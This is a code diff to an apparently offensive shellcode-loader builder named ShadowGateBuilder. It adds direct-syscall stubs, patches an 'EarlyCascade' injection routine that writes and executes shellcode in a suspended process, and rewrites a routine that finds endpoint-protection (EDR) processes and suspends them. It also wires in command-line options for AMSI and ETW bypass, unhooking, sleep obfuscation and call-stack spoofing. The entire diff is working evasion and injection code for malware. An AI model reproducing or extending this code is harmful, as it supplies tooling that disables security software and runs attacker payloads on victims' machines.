@@ -244,6 +244,7 @@ class CodeGenerator:
             "NtUnmapViewOfSection",
             "NtTerminateProcess",
             "NtSuspendProcess",
+            "NtQuerySystemInformation",
         ]
         
         return self.hasher.generate_cpp_defines(common_apis, "djb2", skip_prefix=2)
@@ -801,6 +802,7 @@ extern DWORD g_SyscallCount;
 #define IDX_NtTerminateProcess          18
 #define IDX_NtCreateProcessEx           19
 #define IDX_NtSuspendProcess            20
+#define IDX_NtQuerySystemInformation    21
 
 // ============================================================================
 // Initialization
@@ -839,6 +841,7 @@ NTSTATUS NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGE
 NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
 NTSTATUS NtUnmapViewOfSection(HANDLE, PVOID);
 NTSTATUS NtSuspendProcess(HANDLE);
+NTSTATUS NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
 
 #ifdef __cplusplus
 }
@@ -969,6 +972,13 @@ NTSTATUS NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* B
 NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
     PrepareNextSyscall(IDX_NtUnmapViewOfSection);
     return ((fn_NtUnmapViewOfSection)DoSyscall)(ProcessHandle, BaseAddress);
+}
+
+typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
+
+NTSTATUS NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength) {
+    PrepareNextSyscall(IDX_NtQuerySystemInformation);
+    return ((fn_NtQuerySystemInformation)DoSyscall)(InfoClass, Buffer, Length, ReturnLength);
 }
 '''
     
@@ -1327,6 +1337,7 @@ DWORD64 HashString(LPCSTR str);
             ("UnmapViewOfSection",       "IDX_NtUnmapViewOfSection"),
             ("TerminateProcess",         "IDX_NtTerminateProcess"),
             ("SuspendProcess",           "IDX_NtSuspendProcess"),
+            ("QuerySystemInformation",   "IDX_NtQuerySystemInformation"),
         ]
     
         # Build encrypted name arrays
@@ -2598,12 +2609,15 @@ ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase) {
     if (!pLdrpMrdataBase)
         return 0;
 
-    // Scan forward for first NULL pointer — that's AvrfpAPILookupCallbackRoutine
-    for (ULONG_PTR* p = pLdrpMrdataBase + 1; p < (ULONG_PTR*)(mrdataBase + 0x4000); p++) {
-        if (*p == 0)
-            return (ULONG_PTR)p;
-    }
-    return 0;
+    // AvrfpAPILookupCallbackRoutine is 2 pointers (0x10 bytes) after LdrpMrdataBase on x64
+    // This is a known fixed layout from MalwareTech EDR-Preloader research
+    ULONG_PTR* pAvrfp = pLdrpMrdataBase + 2;
+
+    // Validate: must still be within .mrdata section bounds
+    if ((ULONG_PTR)pAvrfp < mrdataBase || (ULONG_PTR)pAvrfp >= mrdataBase + 0x4000)
+        return 0;
+
+    return (ULONG_PTR)pAvrfp;
 }
 
 // ============================================================================
@@ -2611,9 +2625,10 @@ ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase) {
 // ============================================================================
 
 LPVOID EncodeSystemPtr(LPVOID ptr) {
-    ULONG cookie = *(ULONG*)0x7FFE0330;  // SharedUserData!Cookie
-    ULONGLONG val = (ULONGLONG)ptr;
-    ULONGLONG encoded = _rotr64(cookie ^ val, cookie & 0x3F);
+    ULONG64 cookie64 = (ULONG64)(*(ULONG*)0x7FFE0330);  // zero-extend to 64-bit
+    ULONG64 val      = (ULONG64)ptr;
+    ULONG   rotBits  = (ULONG)(cookie64 & 0x3F);
+    ULONG64 encoded  = _rotr64(val ^ cookie64, rotBits);
     return (LPVOID)encoded;
 }
 
@@ -2625,7 +2640,7 @@ BOOL VerifyNoHooks(VOID) {
     // Expected syscall stub prefix: mov r10,rcx; mov eax,??
     static const BYTE expected[4] = { 0x4C, 0x8B, 0xD1, 0xB8 };
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    HMODULE hNtdll = (HMODULE)GetNtdllFromPEB();  // PEB walk — no Win32 API calls
     if (!hNtdll)
         return FALSE;
 
@@ -2843,6 +2858,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     SIZE_T totalSize  = sizeof(g_EarlyCascadeStub) + pCtx->dwShellcodeSize;
     SIZE_T allocSize  = totalSize;
 
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
     NTSTATUS status = NtAllocateVirtualMemory(
         pi.hProcess, &pRemoteBuf, 0, &allocSize,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -2862,6 +2878,18 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     BYTE stubCopy[sizeof(g_EarlyCascadeStub)];
     memcpy(stubCopy, g_EarlyCascadeStub, sizeof(g_EarlyCascadeStub));
 
+    // Verify stub placeholder offsets before patching (catch any future stub edits)
+    if (*(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHIMSENA_OFFSET) != 0x1111111111111111ULL ||
+        *(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHELLCODE_OFFSET) != 0x2222222222222222ULL) {
+#if DEBUG_BUILD
+        printf("[!] EarlyCascade: Stub placeholder offsets are wrong! Aborting.\n");
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+
     if (bShimPath && pShimsEnabledAddr) {
         memcpy(stubCopy + STUB_SHIMSENA_OFFSET, &pShimsEnabledAddr, sizeof(PVOID));
     }
@@ -2869,8 +2897,10 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
 
     // Write stub + shellcode to target
     SIZE_T written = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     NtWriteVirtualMemory(pi.hProcess, pRemoteBuf,
                          stubCopy, sizeof(g_EarlyCascadeStub), &written);
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     NtWriteVirtualMemory(pi.hProcess,
                          (PVOID)((ULONG_PTR)pRemoteBuf + sizeof(g_EarlyCascadeStub)),
                          pCtx->pShellcode, pCtx->dwShellcodeSize, &written);
@@ -2878,12 +2908,14 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     // Change to RX
     ULONG oldProt = 0;
     SIZE_T protSize = totalSize;
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
     NtProtectVirtualMemory(pi.hProcess, &pRemoteBuf, &protSize,
                            PAGE_EXECUTE_READ, &oldProt);
 
     // Encode stub address and write to callback slot
     LPVOID encodedPtr = EncodeSystemPtr(pRemoteBuf);
     SIZE_T cbWritten  = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
     NtWriteVirtualMemory(pi.hProcess, pCallbackAddr,
                          &encodedPtr, sizeof(PVOID), &cbWritten);
 
@@ -2891,18 +2923,21 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     if (bShimPath && pShimsEnabledAddr) {
         // Write 1 to g_ShimsEnabled in target process
         BYTE enableVal = 1;
+        PrepareNextSyscall(IDX_NtWriteVirtualMemory);
         NtWriteVirtualMemory(pi.hProcess, pShimsEnabledAddr,
                              &enableVal, 1, &cbWritten);
     } else if (bAvrfPath) {
         // Write 1 to the enable flag at callback_address - 8
         PVOID pEnableFlag = (PVOID)((ULONG_PTR)pCallbackAddr - 8);
         BYTE  enableVal   = 1;
+        PrepareNextSyscall(IDX_NtWriteVirtualMemory);
         NtWriteVirtualMemory(pi.hProcess, pEnableFlag,
                              &enableVal, 1, &cbWritten);
     }
 
     // Resume thread to trigger cascade callback
     ULONG suspendCount = 0;
+    PrepareNextSyscall(IDX_NtResumeThread);
     NtResumeThread(pi.hThread, &suspendCount);
 
     pCtx->hProcess   = pi.hProcess;
@@ -3095,7 +3130,6 @@ BOOL FreezeEDRProcesses(VOID);
 
 #include "edr_freeze.h"
 #include "syscalls.h"
-#include <tlhelp32.h>
 #include <stdio.h>
 
 // ============================================================================
@@ -3114,7 +3148,7 @@ static const DWORD g_EdpHashCount =
 // ============================================================================
 
 static DWORD64 Djb2HashA(const char* str) {{
-    DWORD64 hash = 0x00001505ULL;
+    DWORD64 hash = 0x7734773477347734ULL;  // matches HashEngine.DJB2_SEED
     while (*str) {{
         unsigned char c = (unsigned char)*str++;
         if (c >= 'A' && c <= 'Z') c += 32;  // to lowercase
@@ -3124,67 +3158,115 @@ static DWORD64 Djb2HashA(const char* str) {{
 }}
 
 // ============================================================================
+// SYSTEM_PROCESS_INFORMATION structures for NtQuerySystemInformation
+// ============================================================================
+
+#define SystemProcessInformation 5
+
+typedef struct _VM_COUNTERS {{
+    SIZE_T PeakVirtualSize;
+    SIZE_T VirtualSize;
+    ULONG  PageFaultCount;
+    SIZE_T PeakWorkingSetSize;
+    SIZE_T WorkingSetSize;
+    SIZE_T QuotaPeakPagedPoolUsage;
+    SIZE_T QuotaPagedPoolUsage;
+    SIZE_T QuotaPeakNonPagedPoolUsage;
+    SIZE_T QuotaNonPagedPoolUsage;
+    SIZE_T PagefileUsage;
+    SIZE_T PeakPagefileUsage;
+}} VM_COUNTERS, *PVM_COUNTERS;
+
+typedef struct _IO_COUNTERS {{
+    ULONGLONG ReadOperationCount;
+    ULONGLONG WriteOperationCount;
+    ULONGLONG OtherOperationCount;
+    ULONGLONG ReadTransferCount;
+    ULONGLONG WriteTransferCount;
+    ULONGLONG OtherTransferCount;
+}} IO_COUNTERS, *PIO_COUNTERS;
+
+typedef struct _SYSTEM_PROCESS_INFORMATION {{
+    ULONG           NextEntryOffset;
+    ULONG           NumberOfThreads;
+    LARGE_INTEGER   Reserved[3];
+    LARGE_INTEGER   CreateTime;
+    LARGE_INTEGER   UserTime;
+    LARGE_INTEGER   KernelTime;
+    UNICODE_STRING  ImageName;
+    LONG            BasePriority;
+    HANDLE          UniqueProcessId;
+    HANDLE          InheritedFromUniqueProcessId;
+    ULONG           HandleCount;
+    ULONG           Reserved2[2];
+    VM_COUNTERS     VmCounters;
+    IO_COUNTERS     IoCounters;
+}} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+
+// ============================================================================
 // FreezeEDRProcesses
 // ============================================================================
 
 BOOL FreezeEDRProcesses(VOID) {{
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE)
-        return FALSE;
+    // Query required buffer size
+    ULONG ulSize = 0;
+    PrepareNextSyscall(IDX_NtQuerySystemInformation);
+    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ulSize);
+    if (!ulSize) return FALSE;
 
-    PROCESSENTRY32W pe = {{ sizeof(pe) }};
+    ulSize += 0x10000;  // add buffer for new processes between calls
+    PVOID pBuf = VirtualAlloc(NULL, ulSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pBuf) return FALSE;
+
+    PrepareNextSyscall(IDX_NtQuerySystemInformation);
+    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, pBuf, ulSize, &ulSize);
+    if (!NT_SUCCESS(status)) {{ VirtualFree(pBuf, 0, MEM_RELEASE); return FALSE; }}
+
+    PSYSTEM_PROCESS_INFORMATION pCur = (PSYSTEM_PROCESS_INFORMATION)pBuf;
     BOOL result = TRUE;
 
-    if (!Process32FirstW(hSnap, &pe)) {{
-        CloseHandle(hSnap);
-        return FALSE;
-    }}
-
-    do {{
-        // Convert wide name to narrow ASCII for hashing
-        char szName[MAX_PATH];
-        int  len = WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1,
-                                       szName, MAX_PATH, NULL, NULL);
-        if (len <= 0) continue;
-
-        DWORD64 hash = Djb2HashA(szName);
-
-        // Check against hash table
-        BOOL bMatch = FALSE;
-        for (DWORD i = 0; i < g_EdpHashCount; i++) {{
-            if (g_EdpProcessHashes[i] == hash) {{
-                bMatch = TRUE;
-                break;
+    while (TRUE) {{
+        if (pCur->ImageName.Buffer && pCur->ImageName.Length > 0) {{
+            // Convert UNICODE_STRING to narrow ASCII for hashing
+            char szName[MAX_PATH] = {{0}};
+            int len = WideCharToMultiByte(CP_ACP, 0,
+                          pCur->ImageName.Buffer,
+                          pCur->ImageName.Length / sizeof(WCHAR),
+                          szName, MAX_PATH - 1, NULL, NULL);
+            if (len > 0) {{
+                DWORD64 hash = Djb2HashA(szName);
+                BOOL bMatch = FALSE;
+                for (DWORD i = 0; i < g_EdpHashCount; i++) {{
+                    if (g_EdpProcessHashes[i] == hash) {{ bMatch = TRUE; break; }}
+                }}
+                if (bMatch) {{
+                    DWORD dwPid = (DWORD)(ULONG_PTR)pCur->UniqueProcessId;
+                    HANDLE hProc = NULL;
+                    OBJECT_ATTRIBUTES oa = {{ sizeof(oa) }};
+                    CLIENT_ID cid = {{ (HANDLE)(ULONG_PTR)dwPid, NULL }};
+                    PrepareNextSyscall(IDX_NtOpenProcess);
+                    NTSTATUS nsOpen = NtOpenProcess(&hProc, PROCESS_SUSPEND_RESUME, &oa, &cid);
+                    if (NT_SUCCESS(nsOpen) && hProc) {{
+                        PrepareNextSyscall(IDX_NtSuspendProcess);
+                        NtSuspendProcess(hProc);
+#if DEBUG_BUILD
+                        printf("[+] EDR process frozen: PID %lu\\n", dwPid);
+#endif
+                        NtClose(hProc);
+                    }}
+#if DEBUG_BUILD
+                    else {{
+                        printf("[!] NtOpenProcess failed for PID %lu: 0x%08X\\n", dwPid, nsOpen);
+                    }}
+#endif
+                }}
             }}
         }}
+        if (pCur->NextEntryOffset == 0) break;
+        pCur = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCur + pCur->NextEntryOffset);
+    }}
 
-        if (!bMatch) continue;
-
-        // Found an EDR process — freeze it
-        HANDLE hProc = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pe.th32ProcessID);
-        if (!hProc) {{
-#if DEBUG_BUILD
-            printf("[!] OpenProcess failed for PID %lu (access denied or process exited)\\n",
-                   pe.th32ProcessID);
-#endif
-            continue;
-        }}
-
-        PrepareNextSyscall(IDX_NtSuspendProcess);
-        NTSTATUS status = NtSuspendProcess(hProc);
-
-#if DEBUG_BUILD
-        if (status == 0) {{
-            printf("[+] EDR process frozen: PID %lu\\n", pe.th32ProcessID);
-        }} else {{
-            printf("[!] Failed to freeze PID %lu: 0x%08X\\n", pe.th32ProcessID, status);
-        }}
-#endif
-
-        CloseHandle(hProc);
-    }} while (Process32NextW(hSnap, &pe));
-
-    CloseHandle(hSnap);
+    VirtualFree(pBuf, 0, MEM_RELEASE);
     return result;
 }}
 '''
@@ -4351,14 +4433,21 @@ class ShadowGateBuilder:
         output_exe = self.output_dir / self.config.output_file
         
         # Determine which files to compile
-        cpp_files = ['main.cpp', 'syscalls.cpp', 'resolver.cpp', 'injection.cpp', 'evasion.cpp']
-        
+        cpp_files = [
+            'main.cpp', 'syscalls.cpp', 'resolver.cpp',
+            'injection.cpp', 'evasion.cpp',
+            'earlycascade.cpp',   # always needed — injection dispatcher calls InjectEarlyCascade()
+            'callback.cpp',        # always needed — injection dispatcher calls InjectCallback()
+        ]
+
         if self.config.sleep_obfuscation:
             cpp_files.append('sleep_obf.cpp')
         if self.config.callstack_spoof:
             cpp_files.append('callstack.cpp')
         if self.config.dynapi:
             cpp_files.append('dynapi.cpp')
+        if self.config.edr_freeze:
+            cpp_files.append('edr_freeze.cpp')
         
         asm_files = ['asm_syscalls.asm']
         
@@ -4466,7 +4555,7 @@ Injection Methods:
     
     # Required arguments
     parser.add_argument('-i', '--input',
-                        required=True,
+                        required=False,   # not required for profile-save-only runs
                         help='Input shellcode file (.bin)')
     
     parser.add_argument('-o', '--output',
@@ -4644,14 +4733,33 @@ def main():
         print(colored(f"[+] Loaded profile: {args.profile}", Colors.GREEN))
         
         # Override with command line arguments if provided
-        config.input_file = args.input
-        config.output_file = args.output
-        if args.syscall != SYSCALL_INDIRECT:  # Non-default
-            config.syscall = args.syscall
-        # ... similar for other args
+        config.input_file  = args.input  or config.input_file
+        config.output_file = args.output or config.output_file
+        if args.syscall   != SYSCALL_INDIRECT:    config.syscall   = args.syscall
+        if args.resolver  != RESOLVER_HYBRID:     config.resolver  = args.resolver
+        if args.strings   != STRINGS_DJB2:        config.strings   = args.strings
+        if args.encrypt   != ENCRYPT_CASCADE:     config.encrypt   = args.encrypt
+        if args.encode    != ENCODE_UUID:         config.encode    = args.encode
+        if args.inject    != INJECT_EARLYCASCADE: config.inject    = args.inject
+        if args.target    != 'notepad.exe':       config.target    = args.target
+        if args.sleep     != 0:                   config.sleep     = args.sleep
+        if hasattr(args, 'no_sandbox') and args.no_sandbox:   config.sandbox          = False
+        if hasattr(args, 'no_etw')     and args.no_etw:       config.etw              = False
+        if args.unhook:                           config.unhook           = True
+        if args.edr_freeze:                       config.edr_freeze       = True
+        if args.debug:                            config.debug            = True
+        if args.sleep_obf:                        config.sleep_obfuscation = True
+        if hasattr(args, 'no_amsi')    and args.no_amsi:      config.amsi             = False
+        if hasattr(args, 'no_wipe_pe') and args.no_wipe_pe:   config.wipe_pe          = False
+        if args.spoof_stack:                      config.callstack_spoof  = True
+        if args.dynapi:                           config.dynapi           = True
     else:
         config = args_to_config(args)
-    
+
+    # Require --input unless we're only saving a profile
+    if not args.save_profile and not args.input:
+        parser.error("argument -i/--input is required unless --save-profile is used alone")
+
     # Save profile if requested
     if args.save_profile:
         manager = ConfigManager()
